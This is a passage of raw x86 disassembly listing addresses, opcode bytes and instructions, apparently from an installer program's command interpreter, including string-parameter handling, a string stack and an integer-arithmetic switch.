  401716:	88 44 24 14          	mov    %al,0x14(%esp)
  40171a:	88 1e                	mov    %bl,(%esi)
  40171c:	84 c0                	test   %al,%al
  40171e:	75 17                	jne    0x401737
  401720:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  401724:	74 11                	je     0x401737
  401726:	e8 7f 4a 00 00       	call   0x4061aa
  40172b:	85 c0                	test   %eax,%eax
  40172d:	74 08                	je     0x401737
  40172f:	57                   	push   %edi
  401730:	e8 75 44 00 00       	call   0x405baa
  401735:	eb 06                	jmp    0x40173d
  401737:	57                   	push   %edi
  401738:	e8 4d 44 00 00       	call   0x405b8a
  40173d:	85 c0                	test   %eax,%eax
  40173f:	74 16                	je     0x401757
  401741:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401746:	75 0b                	jne    0x401753
  401748:	57                   	push   %edi
  401749:	ff 15 1c 81 40 00    	call   *0x40811c
  40174f:	a8 10                	test   $0x10,%al
  401751:	75 04                	jne    0x401757
  401753:	ff 44 24 10          	incl   0x10(%esp)
  401757:	8a 44 24 14          	mov    0x14(%esp),%al
  40175b:	88 06                	mov    %al,(%esi)
  40175d:	46                   	inc    %esi
  40175e:	84 c0                	test   %al,%al
  401760:	75 a8                	jne    0x40170a
  401762:	68 e8 a4 40 00       	push   $0x40a4e8
  401767:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  40176b:	74 2b                	je     0x401798
  40176d:	6a e6                	push   $0xffffffe6
  40176f:	e8 ee 42 00 00       	call   0x405a62
  401774:	57                   	push   %edi
  401775:	68 00 a8 42 00       	push   $0x42a800
  40177a:	e8 49 50 00 00       	call   0x4067c8
  40177f:	57                   	push   %edi
  401780:	ff 15 38 81 40 00    	call   *0x408138
  401786:	85 c0                	test   %eax,%eax
  401788:	8b 44 24 10          	mov    0x10(%esp),%eax
  40178c:	0f 85 6e 15 00 00    	jne    0x402d00
  401792:	40                   	inc    %eax
  401793:	e9 68 15 00 00       	jmp    0x402d00
  401798:	6a f5                	push   $0xfffffff5
  40179a:	e9 54 fe ff ff       	jmp    0x4015f3
  40179f:	53                   	push   %ebx
  4017a0:	e8 ed 16 00 00       	call   0x402e92
  4017a5:	50                   	push   %eax
  4017a6:	e8 d0 4a 00 00       	call   0x40627b
  4017ab:	e9 aa 06 00 00       	jmp    0x401e5a
  4017b0:	6a d0                	push   $0xffffffd0
  4017b2:	e8 db 16 00 00       	call   0x402e92
  4017b7:	6a df                	push   $0xffffffdf
  4017b9:	8b f0                	mov    %eax,%esi
  4017bb:	e8 d2 16 00 00       	call   0x402e92
  4017c0:	6a 13                	push   $0x13
  4017c2:	8b f8                	mov    %eax,%edi
  4017c4:	e8 c9 16 00 00       	call   0x402e92
  4017c9:	57                   	push   %edi
  4017ca:	56                   	push   %esi
  4017cb:	ff 15 d4 80 40 00    	call   *0x4080d4
  4017d1:	85 c0                	test   %eax,%eax
  4017d3:	74 0c                	je     0x4017e1
  4017d5:	68 e8 a4 40 00       	push   $0x40a4e8
  4017da:	6a e3                	push   $0xffffffe3
  4017dc:	e9 12 fe ff ff       	jmp    0x4015f3
  4017e1:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  4017e5:	0f 84 02 ff ff ff    	je     0x4016ed
  4017eb:	56                   	push   %esi
  4017ec:	e8 8a 4a 00 00       	call   0x40627b
  4017f1:	85 c0                	test   %eax,%eax
  4017f3:	0f 84 f4 fe ff ff    	je     0x4016ed
  4017f9:	57                   	push   %edi
  4017fa:	56                   	push   %esi
  4017fb:	e8 a3 47 00 00       	call   0x405fa3
  401800:	68 e8 a4 40 00       	push   $0x40a4e8
  401805:	6a e4                	push   $0xffffffe4
  401807:	e9 e7 fd ff ff       	jmp    0x4015f3
  40180c:	53                   	push   %ebx
  40180d:	e8 80 16 00 00       	call   0x402e92
  401812:	8b f0                	mov    %eax,%esi
  401814:	bd 00 04 00 00       	mov    $0x400,%ebp
  401819:	8d 44 24 18          	lea    0x18(%esp),%eax
  40181d:	50                   	push   %eax
  40181e:	57                   	push   %edi
  40181f:	55                   	push   %ebp
  401820:	56                   	push   %esi
  401821:	ff 15 18 81 40 00    	call   *0x408118
  401827:	85 c0                	test   %eax,%eax
  401829:	75 0b                	jne    0x401836
  40182b:	33 c0                	xor    %eax,%eax
  40182d:	88 1f                	mov    %bl,(%edi)
  40182f:	40                   	inc    %eax
  401830:	89 44 24 10          	mov    %eax,0x10(%esp)
  401834:	eb 27                	jmp    0x40185d
  401836:	8b 44 24 18          	mov    0x18(%esp),%eax
  40183a:	3b c6                	cmp    %esi,%eax
  40183c:	76 1b                	jbe    0x401859
  40183e:	38 18                	cmp    %bl,(%eax)
  401840:	74 17                	je     0x401859
  401842:	56                   	push   %esi
  401843:	e8 33 4a 00 00       	call   0x40627b
  401848:	85 c0                	test   %eax,%eax
  40184a:	74 df                	je     0x40182b
  40184c:	83 c0 2c             	add    $0x2c,%eax
  40184f:	50                   	push   %eax
  401850:	ff 74 24 1c          	push   0x1c(%esp)
  401854:	e8 6f 4f 00 00       	call   0x4067c8
  401859:	8b 44 24 10          	mov    0x10(%esp),%eax
  40185d:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  401861:	0f 85 99 14 00 00    	jne    0x402d00
  401867:	55                   	push   %ebp
  401868:	57                   	push   %edi
  401869:	57                   	push   %edi
  40186a:	ff 15 ec 80 40 00    	call   *0x4080ec
  401870:	e9 87 14 00 00       	jmp    0x402cfc
  401875:	6a ff                	push   $0xffffffff
  401877:	e8 16 16 00 00       	call   0x402e92
  40187c:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  401880:	51                   	push   %ecx
  401881:	55                   	push   %ebp
  401882:	68 00 04 00 00       	push   $0x400
  401887:	53                   	push   %ebx
  401888:	50                   	push   %eax
  401889:	53                   	push   %ebx
  40188a:	ff 15 34 81 40 00    	call   *0x408134
  401890:	85 c0                	test   %eax,%eax
  401892:	0f 85 64 14 00 00    	jne    0x402cfc
  401898:	33 c0                	xor    %eax,%eax
  40189a:	40                   	inc    %eax
  40189b:	88 5d 00             	mov    %bl,0x0(%ebp)
  40189e:	e9 5d 14 00 00       	jmp    0x402d00
  4018a3:	6a ef                	push   $0xffffffef
  4018a5:	e8 e8 15 00 00       	call   0x402e92
  4018aa:	50                   	push   %eax
  4018ab:	55                   	push   %ebp
  4018ac:	e8 5e 4e 00 00       	call   0x40670f
  4018b1:	e9 2f fe ff ff       	jmp    0x4016e5
  4018b6:	6a 31                	push   $0x31
  4018b8:	e8 d5 15 00 00       	call   0x402e92
  4018bd:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  4018c1:	8b f0                	mov    %eax,%esi
  4018c3:	56                   	push   %esi
  4018c4:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  4018c8:	83 e5 07             	and    $0x7,%ebp
  4018cb:	e8 8c 51 00 00       	call   0x406a5c
  4018d0:	bf e8 a0 40 00       	mov    $0x40a0e8,%edi
  4018d5:	56                   	push   %esi
  4018d6:	85 c0                	test   %eax,%eax
  4018d8:	74 08                	je     0x4018e2
  4018da:	57                   	push   %edi
  4018db:	e8 e8 4e 00 00       	call   0x4067c8
  4018e0:	eb 17                	jmp    0x4018f9
  4018e2:	68 00 a8 42 00       	push   $0x42a800
  4018e7:	57                   	push   %edi
  4018e8:	e8 db 4e 00 00       	call   0x4067c8
  4018ed:	50                   	push   %eax
  4018ee:	e8 11 49 00 00       	call   0x406204
  4018f3:	50                   	push   %eax
  4018f4:	e8 c9 4e 00 00       	call   0x4067c2
  4018f9:	57                   	push   %edi
  4018fa:	e8 ac 50 00 00       	call   0x4069ab
  4018ff:	33 f6                	xor    %esi,%esi
  401901:	46                   	inc    %esi
  401902:	83 fd 03             	cmp    $0x3,%ebp
  401905:	7c 2d                	jl     0x401934
  401907:	57                   	push   %edi
  401908:	e8 6e 49 00 00       	call   0x40627b
  40190d:	8b cb                	mov    %ebx,%ecx
  40190f:	85 c0                	test   %eax,%eax
  401911:	74 11                	je     0x401924
  401913:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401917:	83 c0 14             	add    $0x14,%eax
  40191a:	51                   	push   %ecx
  40191b:	50                   	push   %eax
  40191c:	ff 15 30 81 40 00    	call   *0x408130
  401922:	8b c8                	mov    %eax,%ecx
  401924:	83 c5 fd             	add    $0xfffffffd,%ebp
  401927:	81 cd 00 00 00 80    	or     $0x80000000,%ebp
  40192d:	23 e9                	and    %ecx,%ebp
  40192f:	f7 dd                	neg    %ebp
  401931:	1b ed                	sbb    %ebp,%ebp
  401933:	45                   	inc    %ebp
  401934:	85 ed                	test   %ebp,%ebp
  401936:	75 06                	jne    0x40193e
  401938:	57                   	push   %edi
  401939:	e8 0d 4f 00 00       	call   0x40684b
  40193e:	33 c0                	xor    %eax,%eax
  401940:	3b ee                	cmp    %esi,%ebp
  401942:	0f 95 c0             	setne  %al
  401945:	40                   	inc    %eax
  401946:	50                   	push   %eax
  401947:	68 00 00 00 40       	push   $0x40000000
  40194c:	57                   	push   %edi
  40194d:	e8 86 4c 00 00       	call   0x4065d8
  401952:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401956:	83 f8 ff             	cmp    $0xffffffff,%eax
  401959:	0f 85 87 00 00 00    	jne    0x4019e6
  40195f:	85 ed                	test   %ebp,%ebp
  401961:	75 6a                	jne    0x4019cd
  401963:	68 00 50 42 00       	push   $0x425000
  401968:	68 e8 a8 40 00       	push   $0x40a8e8
  40196d:	e8 56 4e 00 00       	call   0x4067c8
  401972:	57                   	push   %edi
  401973:	68 00 50 42 00       	push   $0x425000
  401978:	e8 4b 4e 00 00       	call   0x4067c8
  40197d:	ff 74 24 3c          	push   0x3c(%esp)
  401981:	68 e8 a4 40 00       	push   $0x40a4e8
  401986:	e8 7a 42 00 00       	call   0x405c05
  40198b:	68 e8 a8 40 00       	push   $0x40a8e8
  401990:	68 00 50 42 00       	push   $0x425000
  401995:	e8 2e 4e 00 00       	call   0x4067c8
  40199a:	8b 44 24 28          	mov    0x28(%esp),%eax
  40199e:	c1 f8 03             	sar    $0x3,%eax
  4019a1:	50                   	push   %eax
  4019a2:	68 e8 a4 40 00       	push   $0x40a4e8
  4019a7:	e8 aa 4d 00 00       	call   0x406756
  4019ac:	83 e8 04             	sub    $0x4,%eax
  4019af:	0f 84 4d ff ff ff    	je     0x401902
  4019b5:	83 e8 01             	sub    $0x1,%eax
  4019b8:	74 08                	je     0x4019c2
  4019ba:	57                   	push   %edi
  4019bb:	6a fa                	push   $0xfffffffa
  4019bd:	e9 fa fb ff ff       	jmp    0x4015bc
  4019c2:	ff 05 c8 40 42 00    	incl   0x4240c8
  4019c8:	e9 39 13 00 00       	jmp    0x402d06
  4019cd:	8b 74 24 18          	mov    0x18(%esp),%esi
  4019d1:	56                   	push   %esi
  4019d2:	6a e2                	push   $0xffffffe2
  4019d4:	e8 89 40 00 00       	call   0x405a62
  4019d9:	33 c0                	xor    %eax,%eax
  4019db:	83 fd 02             	cmp    $0x2,%ebp
  4019de:	0f 94 c0             	sete   %al
  4019e1:	e9 1a 13 00 00       	jmp    0x402d00
  4019e6:	8b 74 24 18          	mov    0x18(%esp),%esi
  4019ea:	56                   	push   %esi
  4019eb:	6a ea                	push   $0xffffffea
  4019ed:	e8 70 40 00 00       	call   0x405a62
  4019f2:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  4019f6:	ff 05 f4 40 42 00    	incl   0x4240f4
  4019fc:	53                   	push   %ebx
  4019fd:	53                   	push   %ebx
  4019fe:	55                   	push   %ebp
  4019ff:	ff 74 24 3c          	push   0x3c(%esp)
  401a03:	e8 4f 15 00 00       	call   0x402f57
  401a08:	ff 0d f4 40 42 00    	decl   0x4240f4
  401a0e:	83 7c 24 34 ff       	cmpl   $0xffffffff,0x34(%esp)
  401a13:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401a17:	75 07                	jne    0x401a20
  401a19:	83 7c 24 38 ff       	cmpl   $0xffffffff,0x38(%esp)
  401a1e:	74 0e                	je     0x401a2e
  401a20:	8d 44 24 34          	lea    0x34(%esp),%eax
  401a24:	50                   	push   %eax
  401a25:	53                   	push   %ebx
  401a26:	50                   	push   %eax
  401a27:	55                   	push   %ebp
  401a28:	ff 15 0c 81 40 00    	call   *0x40810c
  401a2e:	55                   	push   %ebp
  401a2f:	ff 15 08 81 40 00    	call   *0x408108
  401a35:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401a39:	85 c0                	test   %eax,%eax
  401a3b:	0f 89 bb 12 00 00    	jns    0x402cfc
  401a41:	83 f8 fe             	cmp    $0xfffffffe,%eax
  401a44:	75 11                	jne    0x401a57
  401a46:	6a e9                	push   $0xffffffe9
  401a48:	57                   	push   %edi
  401a49:	e8 b7 41 00 00       	call   0x405c05
  401a4e:	56                   	push   %esi
  401a4f:	57                   	push   %edi
  401a50:	e8 6d 4d 00 00       	call   0x4067c2
  401a55:	eb 08                	jmp    0x401a5f
  401a57:	6a ee                	push   $0xffffffee
  401a59:	57                   	push   %edi
  401a5a:	e8 a6 41 00 00       	call   0x405c05
  401a5f:	68 10 00 20 00       	push   $0x200010
  401a64:	57                   	push   %edi
  401a65:	e8 ec 4c 00 00       	call   0x406756
  401a6a:	e9 52 fb ff ff       	jmp    0x4015c1
  401a6f:	53                   	push   %ebx
  401a70:	e8 1d 14 00 00       	call   0x402e92
  401a75:	ff 74 24 2c          	push   0x2c(%esp)
  401a79:	50                   	push   %eax
  401a7a:	e8 3c 49 00 00       	call   0x4063bb
  401a7f:	e9 78 12 00 00       	jmp    0x402cfc
  401a84:	6a 31                	push   $0x31
  401a86:	e8 07 14 00 00       	call   0x402e92
  401a8b:	ff 74 24 28          	push   0x28(%esp)
  401a8f:	50                   	push   %eax
  401a90:	e8 c1 4c 00 00       	call   0x406756
  401a95:	85 c0                	test   %eax,%eax
  401a97:	0f 84 50 fc ff ff    	je     0x4016ed
  401a9d:	3b 44 24 30          	cmp    0x30(%esp),%eax
  401aa1:	0f 84 47 01 00 00    	je     0x401bee
  401aa7:	3b 44 24 38          	cmp    0x38(%esp),%eax
  401aab:	0f 85 4b 12 00 00    	jne    0x402cfc
  401ab1:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  401ab5:	e9 4e 12 00 00       	jmp    0x402d08
  401aba:	6a f0                	push   $0xfffffff0
  401abc:	eb b2                	jmp    0x401a70
  401abe:	6a 01                	push   $0x1
  401ac0:	e8 cd 13 00 00       	call   0x402e92
  401ac5:	50                   	push   %eax
  401ac6:	e8 13 4d 00 00       	call   0x4067de
  401acb:	50                   	push   %eax
  401acc:	e9 ca fb ff ff       	jmp    0x40169b
  401ad1:	6a 02                	push   $0x2
  401ad3:	e8 7e 13 00 00       	call   0x402e56
  401ad8:	6a 03                	push   $0x3
  401ada:	8b f8                	mov    %eax,%edi
  401adc:	8b f2                	mov    %edx,%esi
  401ade:	e8 73 13 00 00       	call   0x402e56
  401ae3:	59                   	pop    %ecx
  401ae4:	59                   	pop    %ecx
  401ae5:	6a 01                	push   $0x1
  401ae7:	89 44 24 20          	mov    %eax,0x20(%esp)
  401aeb:	e8 a2 13 00 00       	call   0x402e92
  401af0:	50                   	push   %eax
  401af1:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401af5:	e8 e4 4c 00 00       	call   0x4067de
  401afa:	85 f6                	test   %esi,%esi
  401afc:	88 5d 00             	mov    %bl,0x0(%ebp)
  401aff:	8b c8                	mov    %eax,%ecx
  401b01:	0f 44 f9             	cmove  %ecx,%edi
  401b04:	85 ff                	test   %edi,%edi
  401b06:	0f 84 f0 11 00 00    	je     0x402cfc
  401b0c:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401b10:	85 c0                	test   %eax,%eax
  401b12:	79 08                	jns    0x401b1c
  401b14:	03 c1                	add    %ecx,%eax
  401b16:	0f 88 e0 11 00 00    	js     0x402cfc
  401b1c:	3b c1                	cmp    %ecx,%eax
  401b1e:	0f 4f c1             	cmovg  %ecx,%eax
  401b21:	03 44 24 18          	add    0x18(%esp),%eax
  401b25:	50                   	push   %eax
  401b26:	55                   	push   %ebp
  401b27:	e8 9c 4c 00 00       	call   0x4067c8
  401b2c:	85 ff                	test   %edi,%edi
  401b2e:	79 08                	jns    0x401b38
  401b30:	55                   	push   %ebp
  401b31:	e8 a8 4c 00 00       	call   0x4067de
  401b36:	03 f8                	add    %eax,%edi
  401b38:	33 c0                	xor    %eax,%eax
  401b3a:	85 ff                	test   %edi,%edi
  401b3c:	0f 49 c7             	cmovns %edi,%eax
  401b3f:	3d 00 04 00 00       	cmp    $0x400,%eax
  401b44:	0f 8d b2 11 00 00    	jge    0x402cfc
  401b4a:	88 1c 28             	mov    %bl,(%eax,%ebp,1)
  401b4d:	e9 aa 11 00 00       	jmp    0x402cfc
  401b52:	6a 20                	push   $0x20
  401b54:	e8 39 13 00 00       	call   0x402e92
  401b59:	6a 31                	push   $0x31
  401b5b:	8b f0                	mov    %eax,%esi
  401b5d:	e8 30 13 00 00       	call   0x402e92
  401b62:	50                   	push   %eax
  401b63:	56                   	push   %esi
  401b64:	39 5c 24 40          	cmp    %ebx,0x40(%esp)
  401b68:	75 08                	jne    0x401b72
  401b6a:	ff 15 e0 80 40 00    	call   *0x4080e0
  401b70:	eb 06                	jmp    0x401b78
  401b72:	ff 15 e4 80 40 00    	call   *0x4080e4
  401b78:	85 c0                	test   %eax,%eax
  401b7a:	75 72                	jne    0x401bee
  401b7c:	8b 44 24 30          	mov    0x30(%esp),%eax
  401b80:	e9 83 11 00 00       	jmp    0x402d08
  401b85:	33 f6                	xor    %esi,%esi
  401b87:	46                   	inc    %esi
  401b88:	56                   	push   %esi
  401b89:	e8 04 13 00 00       	call   0x402e92
  401b8e:	68 00 04 00 00       	push   $0x400
  401b93:	8b f8                	mov    %eax,%edi
  401b95:	55                   	push   %ebp
  401b96:	57                   	push   %edi
  401b97:	ff 15 3c 81 40 00    	call   *0x40813c
  401b9d:	85 c0                	test   %eax,%eax
  401b9f:	74 12                	je     0x401bb3
  401ba1:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  401ba5:	74 13                	je     0x401bba
  401ba7:	55                   	push   %ebp
  401ba8:	57                   	push   %edi
  401ba9:	ff 15 e4 80 40 00    	call   *0x4080e4
  401baf:	85 c0                	test   %eax,%eax
  401bb1:	75 07                	jne    0x401bba
  401bb3:	8b c6                	mov    %esi,%eax
  401bb5:	88 5d 00             	mov    %bl,0x0(%ebp)
  401bb8:	eb 04                	jmp    0x401bbe
  401bba:	8b 44 24 10          	mov    0x10(%esp),%eax
  401bbe:	88 9d ff 03 00 00    	mov    %bl,0x3ff(%ebp)
  401bc4:	e9 37 11 00 00       	jmp    0x402d00
  401bc9:	8b 74 24 3c          	mov    0x3c(%esp),%esi
  401bcd:	53                   	push   %ebx
  401bce:	e8 83 12 00 00       	call   0x402e56
  401bd3:	6a 01                	push   $0x1
  401bd5:	8b f8                	mov    %eax,%edi
  401bd7:	e8 7a 12 00 00       	call   0x402e56
  401bdc:	59                   	pop    %ecx
  401bdd:	59                   	pop    %ecx
  401bde:	85 f6                	test   %esi,%esi
  401be0:	75 08                	jne    0x401bea
  401be2:	3b f8                	cmp    %eax,%edi
  401be4:	7c 08                	jl     0x401bee
  401be6:	7e 94                	jle    0x401b7c
  401be8:	eb 0f                	jmp    0x401bf9
  401bea:	3b f8                	cmp    %eax,%edi
  401bec:	73 09                	jae    0x401bf7
  401bee:	8b 44 24 34          	mov    0x34(%esp),%eax
  401bf2:	e9 11 11 00 00       	jmp    0x402d08
  401bf7:	76 83                	jbe    0x401b7c
  401bf9:	8b 44 24 38          	mov    0x38(%esp),%eax
  401bfd:	e9 06 11 00 00       	jmp    0x402d08
  401c02:	33 ff                	xor    %edi,%edi
  401c04:	47                   	inc    %edi
  401c05:	57                   	push   %edi
  401c06:	e8 4b 12 00 00       	call   0x402e56
  401c0b:	6a 02                	push   $0x2
  401c0d:	8b f0                	mov    %eax,%esi
  401c0f:	e8 42 12 00 00       	call   0x402e56
  401c14:	59                   	pop    %ecx
  401c15:	59                   	pop    %ecx
  401c16:	8b c8                	mov    %eax,%ecx
  401c18:	8b 44 24 34          	mov    0x34(%esp),%eax
  401c1c:	83 f8 0d             	cmp    $0xd,%eax
  401c1f:	77 72                	ja     0x401c93
  401c21:	ff 24 85 1e 2e 40 00 	jmp    *0x402e1e(,%eax,4)
  401c28:	03 f1                	add    %ecx,%esi
  401c2a:	eb 67                	jmp    0x401c93
  401c2c:	2b f1                	sub    %ecx,%esi
  401c2e:	eb 63                	jmp    0x401c93
  401c30:	0f af f1             	imul   %ecx,%esi
  401c33:	eb 5e                	jmp    0x401c93
  401c35:	85 c9                	test   %ecx,%ecx
  401c37:	74 09                	je     0x401c42
  401c39:	8b c6                	mov    %esi,%eax
  401c3b:	99                   	cltd
  401c3c:	f7 f9                	idiv   %ecx
  401c3e:	8b f0                	mov    %eax,%esi
  401c40:	eb 02                	jmp    0x401c44
  401c42:	8b f3                	mov    %ebx,%esi
  401c44:	33 c0                	xor    %eax,%eax
  401c46:	85 c9                	test   %ecx,%ecx
  401c48:	0f 94 c0             	sete   %al
  401c4b:	89 44 24 10          	mov    %eax,0x10(%esp)
  401c4f:	eb 42                	jmp    0x401c93
  401c51:	0b f1                	or     %ecx,%esi
  401c53:	eb 3e                	jmp    0x401c93
  401c55:	23 f1                	and    %ecx,%esi
  401c57:	eb 3a                	jmp    0x401c93
  401c59:	33 f1                	xor    %ecx,%esi
  401c5b:	eb 36                	jmp    0x401c93
  401c5d:	33 c0                	xor    %eax,%eax
  401c5f:	85 f6                	test   %esi,%esi
  401c61:	0f 94 c0             	sete   %al
  401c64:	8b f0                	mov    %eax,%esi
  401c66:	eb 2b                	jmp    0x401c93
  401c68:	85 f6                	test   %esi,%esi
  401c6a:	75 04                	jne    0x401c70
  401c6c:	85 c9                	test   %ecx,%ecx
  401c6e:	74 08                	je     0x401c78
  401c70:	8b f7                	mov    %edi,%esi
  401c72:	eb 1f                	jmp    0x401c93
  401c74:	85 f6                	test   %esi,%esi
  401c76:	75 f4                	jne    0x401c6c
  401c78:	8b f3                	mov    %ebx,%esi
  401c7a:	eb 17                	jmp    0x401c93
  401c7c:	85 c9                	test   %ecx,%ecx
  401c7e:	74 c2                	je     0x401c42
  401c80:	8b c6                	mov    %esi,%eax
  401c82:	99                   	cltd
  401c83:	f7 f9                	idiv   %ecx
  401c85:	8b f2                	mov    %edx,%esi
  401c87:	eb bb                	jmp    0x401c44
  401c89:	d3 e6                	shl    %cl,%esi
  401c8b:	eb 06                	jmp    0x401c93
  401c8d:	d3 fe                	sar    %cl,%esi
  401c8f:	eb 02                	jmp    0x401c93
  401c91:	d3 ee                	shr    %cl,%esi
  401c93:	56                   	push   %esi
  401c94:	e9 02 fa ff ff       	jmp    0x40169b
  401c99:	6a 01                	push   $0x1
  401c9b:	e8 f2 11 00 00       	call   0x402e92
  401ca0:	6a 02                	push   $0x2
  401ca2:	8b f0                	mov    %eax,%esi
  401ca4:	e8 ad 11 00 00       	call   0x402e56
  401ca9:	50                   	push   %eax
  401caa:	56                   	push   %esi
  401cab:	55                   	push   %ebp
  401cac:	ff 15 44 82 40 00    	call   *0x408244
  401cb2:	83 c4 10             	add    $0x10,%esp
  401cb5:	e9 42 10 00 00       	jmp    0x402cfc
  401cba:	8b 44 24 30          	mov    0x30(%esp),%eax
  401cbe:	8b 35 e0 a0 40 00    	mov    0x40a0e0,%esi
  401cc4:	85 c0                	test   %eax,%eax
  401cc6:	74 54                	je     0x401d1c
  401cc8:	48                   	dec    %eax
  401cc9:	85 f6                	test   %esi,%esi
  401ccb:	74 3c                	je     0x401d09
  401ccd:	8b 36                	mov    (%esi),%esi
  401ccf:	85 c0                	test   %eax,%eax
  401cd1:	75 f5                	jne    0x401cc8
  401cd3:	85 f6                	test   %esi,%esi
  401cd5:	74 32                	je     0x401d09
  401cd7:	83 c6 04             	add    $0x4,%esi
  401cda:	bf e8 a0 40 00       	mov    $0x40a0e8,%edi
  401cdf:	56                   	push   %esi
  401ce0:	57                   	push   %edi
  401ce1:	e8 e2 4a 00 00       	call   0x4067c8
  401ce6:	a1 e0 a0 40 00       	mov    0x40a0e0,%eax
  401ceb:	83 c0 04             	add    $0x4,%eax
  401cee:	50                   	push   %eax
  401cef:	56                   	push   %esi
  401cf0:	e8 d3 4a 00 00       	call   0x4067c8
  401cf5:	a1 e0 a0 40 00       	mov    0x40a0e0,%eax
  401cfa:	57                   	push   %edi
  401cfb:	83 c0 04             	add    $0x4,%eax
  401cfe:	50                   	push   %eax
  401cff:	e8 c4 4a 00 00       	call   0x4067c8
  401d04:	e9 f3 0f 00 00       	jmp    0x402cfc
  401d09:	68 10 00 20 00       	push   $0x200010
  401d0e:	6a e8                	push   $0xffffffe8
  401d10:	53                   	push   %ebx
  401d11:	e8 ef 3e 00 00       	call   0x405c05
  401d16:	50                   	push   %eax
  401d17:	e9 49 fd ff ff       	jmp    0x401a65
  401d1c:	85 c9                	test   %ecx,%ecx
  401d1e:	74 25                	je     0x401d45
  401d20:	85 f6                	test   %esi,%esi
  401d22:	0f 84 c5 f9 ff ff    	je     0x4016ed
  401d28:	8d 46 04             	lea    0x4(%esi),%eax
  401d2b:	50                   	push   %eax
  401d2c:	55                   	push   %ebp
  401d2d:	e8 96 4a 00 00       	call   0x4067c8
  401d32:	8b 06                	mov    (%esi),%eax
  401d34:	a3 e0 a0 40 00       	mov    %eax,0x40a0e0
  401d39:	56                   	push   %esi
  401d3a:	ff 15 f0 80 40 00    	call   *0x4080f0
  401d40:	e9 b7 0f 00 00       	jmp    0x402cfc
  401d45:	68 04 04 00 00       	push   $0x404
  401d4a:	6a 40                	push   $0x40
  401d4c:	ff 15 f4 80 40 00    	call   *0x4080f4
  401d52:	ff 74 24 28          	push   0x28(%esp)
  401d56:	8b f0                	mov    %eax,%esi
  401d58:	8d 46 04             	lea    0x4(%esi),%eax
  401d5b:	50                   	push   %eax
  401d5c:	e8 a4 3e 00 00       	call   0x405c05
  401d61:	a1 e0 a0 40 00       	mov    0x40a0e0,%eax
  401d66:	89 06                	mov    %eax,(%esi)
  401d68:	89 35 e0 a0 40 00    	mov    %esi,0x40a0e0
  401d6e:	e9 89 0f 00 00       	jmp    0x402cfc
  401d73:	6a 03                	push   $0x3
  401d75:	e8 dc 10 00 00       	call   0x402e56
  401d7a:	8b f0                	mov    %eax,%esi
  401d7c:	6a 04                	push   $0x4
  401d7e:	89 74 24 20          	mov    %esi,0x20(%esp)
  401d82:	e8 cf 10 00 00       	call   0x402e56
  401d87:	8b f8                	mov    %eax,%edi
  401d89:	8b 44 24 44          	mov    0x44(%esp),%eax
  401d8d:	59                   	pop    %ecx
  401d8e:	59                   	pop    %ecx
  401d8f:	a8 01                	test   $0x1,%al
  401d91:	74 11                	je     0x401da4
  401d93:	6a 33                	push   $0x33
  401d95:	e8 f8 10 00 00       	call   0x402e92
  401d9a:	8b f0                	mov    %eax,%esi
  401d9c:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  401da0:	89 74 24 18          	mov    %esi,0x18(%esp)
  401da4:	a8 02                	test   $0x2,%al
  401da6:	74 09                	je     0x401db1
  401da8:	6a 44                	push   $0x44
  401daa:	e8 e3 10 00 00       	call   0x402e92
  401daf:	8b f8                	mov    %eax,%edi
  401db1:	83 7c 24 24 21       	cmpl   $0x21,0x24(%esp)
  401db6:	6a 01                	push   $0x1
  401db8:	75 4f                	jne    0x401e09
  401dba:	e8 97 10 00 00       	call   0x402e56
  401dbf:	6a 02                	push   $0x2
  401dc1:	89 44 24 20          	mov    %eax,0x20(%esp)
  401dc5:	e8 8c 10 00 00       	call   0x402e56
  401dca:	59                   	pop    %ecx
  401dcb:	59                   	pop    %ecx
  401dcc:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  401dd0:	c1 f9 02             	sar    $0x2,%ecx
  401dd3:	85 c9                	test   %ecx,%ecx
  401dd5:	74 23                	je     0x401dfa
  401dd7:	8d 54 24 14          	lea    0x14(%esp),%edx
  401ddb:	52                   	push   %edx
  401ddc:	51                   	push   %ecx
  401ddd:	53                   	push   %ebx
  401dde:	57                   	push   %edi
  401ddf:	56                   	push   %esi
  401de0:	50                   	push   %eax
  401de1:	ff 74 24 30          	push   0x30(%esp)
  401de5:	ff 15 3c 82 40 00    	call   *0x40823c
  401deb:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401def:	f7 d8                	neg    %eax
  401df1:	1b c0                	sbb    %eax,%eax
  401df3:	40                   	inc    %eax
  401df4:	89 44 24 10          	mov    %eax,0x10(%esp)
  401df8:	eb 42                	jmp    0x401e3c
  401dfa:	57                   	push   %edi
  401dfb:	56                   	push   %esi
  401dfc:	50                   	push   %eax
  401dfd:	ff 74 24 24          	push   0x24(%esp)
  401e01:	ff 15 40 82 40 00    	call   *0x408240
  401e07:	eb 29                	jmp    0x401e32
  401e09:	e8 84 10 00 00       	call   0x402e92
  401e0e:	6a 12                	push   $0x12
  401e10:	8b f0                	mov    %eax,%esi
  401e12:	e8 7b 10 00 00       	call   0x402e92
  401e17:	33 c9                	xor    %ecx,%ecx
  401e19:	38 08                	cmp    %cl,(%eax)
  401e1b:	0f 45 c8             	cmovne %eax,%ecx
  401e1e:	51                   	push   %ecx
  401e1f:	33 c9                	xor    %ecx,%ecx
  401e21:	38 0e                	cmp    %cl,(%esi)
  401e23:	0f 45 ce             	cmovne %esi,%ecx
  401e26:	51                   	push   %ecx
  401e27:	57                   	push   %edi
  401e28:	ff 74 24 24          	push   0x24(%esp)
  401e2c:	ff 15 10 82 40 00    	call   *0x408210
  401e32:	8b c8                	mov    %eax,%ecx
  401e34:	8b 44 24 10          	mov    0x10(%esp),%eax
